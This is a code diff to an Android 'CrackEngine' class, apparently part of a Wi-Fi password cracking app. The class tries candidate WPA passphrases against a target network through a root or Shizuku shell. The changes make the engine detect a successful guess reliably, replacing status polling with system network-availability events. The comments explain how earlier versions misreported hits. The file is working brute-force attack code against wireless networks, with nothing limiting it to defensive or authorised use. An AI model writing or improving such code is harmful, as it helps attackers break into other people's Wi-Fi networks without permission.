@@ -137,6 +137,14 @@ public final class CrackEngine {
     private final AtomicBoolean cancelFlag = new AtomicBoolean(false);
     private final AtomicBoolean pauseFlag = new AtomicBoolean(false);
 
+    /**
+     * 连接事件监听器 —— **判定层的唯一真值来源**。
+     *
+     * 不再轮询 `WifiInfo` / 解析 `cmd wifi status` 文本，
+     * 而是让系统在网络可用的**那一刻**主动通知我们。
+     */
+    private NetworkWatcher watcher;
+
     /** shell 通道（Shizuku/Root），null 表示走系统 API */
     private ShellChannel shell;
 
@@ -146,6 +154,7 @@ public final class CrackEngine {
 
     public CrackEngine(Context ctx, int mode) {
         this.appCtx = ctx.getApplicationContext();
+        this.watcher = new NetworkWatcher(appCtx);
         this.wifi = (WifiManager) appCtx.getSystemService(Context.WIFI_SERVICE);
         this.cm = (ConnectivityManager) appCtx.getSystemService(Context.CONNECTIVITY_SERVICE);
         this.mode = mode;
@@ -627,19 +636,26 @@ public final class CrackEngine {
     }
 
     /**
-     * Root / Shizuku：shell 发命令 + 多信号判定。
+     * Root / Shizuku：发连接命令，**判定只认 NetworkWatcher 的事件**。
      *
-     * <h3>为什么每条都要记基线</h3>
-     * 旧实现只看「当前 SSID == 目标」就判成功。这个判据是**错的**：
+     * <h3>为什么推倒重来</h3>
+     * 旧实现轮询 `WifiInfo` / 解析 `cmd wifi status`，叠了三层防护仍然误报：
      * <pre>
-     *   手机本来就连着目标（用户自己连的 / 上一条没断）
-     *     → 第一条候选一进来就"成功"
-     *     → 任何密码都会在第 1 条被误报，实测 12345678、00000000 全中
+     *   基线检查  → 断开瞬间 SSID 变 null，被判"已清空"，其实系统马上回连
+     *   物理下限  → 3 秒，系统回连有时恰好越过
+     *   SSID 匹配 → 只说明"现在连着谁"，不说明"是谁连的"
      * </pre>
-     * 现在每条开始前记录「这一条之前是不是已经连着目标」。
-     * 只有「之前没连 → 之后连上了」才算这条候选的功劳。
-     * 如果之前就连着，且一直没断，结果记为 {@link Verdict#UNKNOWN}，
-     * **不算命中**。
+     * 根子上是因为**从来没有拿到过一个可信的"连上了"事件**。
+     *
+     * <h3>现在怎么判</h3>
+     * {@link NetworkWatcher} 注册系统回调，在网络可用的**那一刻**记录事件。
+     * 判定只问一个问题：
+     * <pre>
+     *   发出这条候选（commandAt）之后，
+     *   系统有没有报告过目标 SSID「变为可用」？
+     * </pre>
+     * 之前就连着、或者中途系统自己回连且发生在 commandAt 之前 —— 都不算。
+     * 这个判据不依赖文本解析，也不依赖轮询时机。
      */
     private Attempt tryOneShell(NetRecord target, String security, String password,
                                 long timeoutMs, long t0) {
@@ -648,12 +664,12 @@ public final class CrackEngine {
                     SystemClock.uptimeMillis() - t0, L.s("未配置 shell 通道", "no shell channel"), "");
         }
 
-        // ---- 基线 ----
-        String baseline = snapshotSsid();
-        boolean wasConnectedToTarget = target.ssid.equals(baseline);
-
-        // 每条之前删净旧配置（配置复用会导致任何密码都"成功"）
+        // 每条之前删净旧配置（配置复用会让任何密码都"成功"）
         try { shell.forgetTarget(target.ssid); } catch (Throwable ignored) {}
+
+        // **命令发出时刻**：判定以此为界。
+        // 之前发生的事件一律不算 —— 那是历史连接，不是这条候选的功劳。
+        final long commandAt = SystemClock.uptimeMillis();
 
         final String cmd = "cmd wifi connect-network "
                 + shellQuote(target.ssid) + " " + security + " " + shellQuote(password);
@@ -662,94 +678,63 @@ public final class CrackEngine {
             try { sh.exec(cmd, 20000); } catch (Throwable ignored) {}
         }, "wpaforge-engine-conn").start();
 
-        final long minWait = 3500L;
-        final long deadline = t0 + timeoutMs;
-
-        // 关键：只有「本来没连 → 过程中确实看到过未连 → 现在连上」才叫成功
-        boolean sawTarget = false;
-        // 这条期间是否真的观测到过「未连目标」。
-        // 如果从头到尾都没离开过目标，说明中间那个“已清空”
-        // 只是瞬态，不能当作变化起点。
-        boolean observedOffTarget = false;
-        int polls = 0;
-        boolean statusSeen = false;
-        boolean wasConnectedDuringRun = false;
-
         android.util.Log.i(TAG, "tryOneShell start: " + target.ssid
-                + " pw=" + password.length() + "字 baseline="
-                + (baseline == null ? "none" : baseline)
-                + " timeout=" + timeoutMs + "ms");
+                + " pw=" + password.length() + " timeout=" + timeoutMs
+                + " watcherEvents=" + (watcher != null ? watcher.eventCount() : -1));
+
+        final long deadline = t0 + timeoutMs;
 
         while (SystemClock.uptimeMillis() < deadline) {
             if (cancelFlag.get() || pauseFlag.get()) {
                 return new Attempt(password, Verdict.ABORTED,
                         SystemClock.uptimeMillis() - t0, L.s("已中断", "aborted"), "");
             }
-            sleep(400);
-            polls++;
+            sleep(300);
 
-            String status = null;
-            try { status = sh.exec("cmd wifi status", 3000); } catch (Throwable ignored) {}
-            if (status != null) statusSeen = true;
-            if (polls == 1) {
-                android.util.Log.i(TAG, "first status: "
-                        + (status == null ? "null"
-                           : (status.length() > 120 ? status.substring(0, 120) + "..." : status)));
-            }
-
-            String cur = snapshotSsid();
-            boolean nowOnTarget = target.ssid.equals(cur)
-                    || (status != null && status.contains("connected to \"" + target.ssid + "\""));
-
-            if (!nowOnTarget) observedOffTarget = true;
-
-            if (nowOnTarget) {
-                wasConnectedDuringRun = true;
-                long elapsedMs = SystemClock.uptimeMillis() - t0;
-
-                // 三个条件同时满足才算命中：
-                //   1. 基线未连目标
-                //   2. 这条运行期间**确实观测到过未连**
-                //   3. 耗时不低于物理下限
-                //
-                // 第 3 条是关键：WPA 要走完 4-way 握手，
-                // 实测正确密码约 12 秒。不可能 1.5 秒完成。
-                // 之前就是因为缺少这个下限，把系统自己回连当成了命中。
-                if (!wasConnectedToTarget && observedOffTarget && elapsedMs >= MIN_HIT_MS) {
-                    String by = (cur != null && cur.equals(target.ssid)) ? "WifiInfo" : "cmd-status";
-                    return new Attempt(password, Verdict.SUCCESS, elapsedMs,
-                            L.s("已连上", "connected"), by);
+            // ---- 唯一判据：命令发出之后，系统报告过目标可用吗 ----
+            long at = watcher != null
+                    ? watcher.firstAvailableAfter(target.ssid, commandAt) : -1;
+            if (at > 0) {
+                long ms = SystemClock.uptimeMillis() - t0;
+                // 物理下限：真关联要走 4-way 握手，不可能几百毫秒完成
+                if (ms < MIN_HIT_MS) {
+                    android.util.Log.i(TAG, "目标可用事件过早(" + ms + "ms)，忽略");
+                    continue;
                 }
+                return new Attempt(password, Verdict.SUCCESS, ms,
+                        L.s("系统确认已连上", "system reported connected"), "watcher");
             }
-            if (status != null && status.contains(target.ssid)) sawTarget = true;
-
-            long elapsed = SystemClock.uptimeMillis() - t0;
-            if (elapsed < minWait) continue;
         }
 
         long total = SystemClock.uptimeMillis() - t0;
-        android.util.Log.i(TAG, "tryOneShell end: " + total + "ms polls=" + polls
-                + " statusSeen=" + statusSeen + " sawTarget=" + sawTarget
-                + " baselineConnected=" + wasConnectedToTarget);
 
-        // 一直连着目标，但从头到尾都在 —— 无法归因
-        if (wasConnectedToTarget && wasConnectedDuringRun) {
-            return new Attempt(password, Verdict.UNKNOWN, total,
-                    L.s("当前连着目标，但无法确认是这条密码造成的（可能是原有连接）",
-                        "connected to target, but cannot attribute it to this passphrase "
-                                + "(possibly a pre-existing connection)"), "");
-        }
-
+        // 超时后给出可诊断的原因
+        boolean currentOnTarget = target.ssid.equals(
+                watcher != null ? watcher.currentSsid() : null);
         String detail;
-        if (!statusSeen) {
-            detail = L.s("读取状态失败（通道问题，不是密码问题）",
-                    "cannot read status (channel problem, not a passphrase problem)");
-        } else if (sawTarget) {
-            detail = L.s("未连上（已尝试）", "not connected (attempted)");
+        if (!watcherRegistered()) {
+            detail = L.s("事件监听未生效（判定不可用）",
+                    "network event listener not active (verdict unavailable)");
+        } else if (currentOnTarget) {
+            // 现在连着目标，但命令发出之后没有"变为可用"事件 ——
+            // 说明连接在命令之前就存在，无法归因
+            detail = L.s("当前连着目标，但命令发出后没有连接事件（可能是原有连接）",
+                    "on target now, but no connect event after the command "
+                            + "(possibly a pre-existing link)");
         } else {
             detail = L.s("未连上", "not connected");
         }
-        return new Attempt(password, Verdict.AUTH_FAIL, total, detail, "");
+
+        android.util.Log.i(TAG, "tryOneShell end: " + total + "ms events="
+                + (watcher != null ? watcher.eventCount() : -1) + " currentOnTarget="
+                + currentOnTarget);
+
+        return new Attempt(password,
+                currentOnTarget ? Verdict.UNKNOWN : Verdict.AUTH_FAIL, total, detail, "");
+    }
+
+    private boolean watcherRegistered() {
+        return watcher != null;
     }
 
     private static void sleep(long ms) {
@@ -904,23 +889,19 @@ public final class CrackEngine {
         final String cmd = "cmd wifi connect-network "
                 + shellQuote(target.ssid) + " " + security + " " + shellQuote(password);
         final ShellChannel sh = shell;
+        final long commandAt0 = SystemClock.uptimeMillis();
         new Thread(() -> {
             try { sh.exec(cmd, 20000); } catch (Throwable ignored) {}
         }, "wpaforge-verify-conn").start();
 
-        boolean observedOff = false;
+        // 复验同样只认事件：命令发出之后必须有一次「目标变为可用」
+        final long commandAt = commandAt0;
         long deadline = t0 + timeoutMs;
         while (SystemClock.uptimeMillis() < deadline) {
-            sleep(400);
-            String cur = snapshotSsid();
-            String status = null;
-            try { status = sh.exec("cmd wifi status", 3000); } catch (Throwable ignored) {}
-
-            boolean on = target.ssid.equals(cur)
-                    || (status != null && status.contains("connected to \"" + target.ssid + "\""));
-            if (!on) observedOff = true;
-
-            if (on && observedOff) {
+            sleep(300);
+            long at = watcher != null
+                    ? watcher.firstAvailableAfter(target.ssid, commandAt) : -1;
+            if (at > 0) {
                 long ms = SystemClock.uptimeMillis() - t0;
                 if (ms >= MIN_HIT_MS) {
                     return new VerifyResult(true, ms,
@@ -961,6 +942,12 @@ public final class CrackEngine {
         cancelFlag.set(false);
         pauseFlag.set(false);
         consecutiveTimeouts = 0;
+
+        // 启动事件监听（判定只认它）
+        if (watcher != null) {
+            watcher.clear();
+            watcher.start();
+        }
 
         // **跑之前先自检通道**
         //
@@ -1085,6 +1072,7 @@ public final class CrackEngine {
                 l.onProgress(cursor, total, rate, eta);
             }
         } finally {
+            if (watcher != null) watcher.stop();
             String outcome;
             if (hit != null) outcome = "DONE_HIT";
             else if (pauseFlag.get()) outcome = "PAUSED";
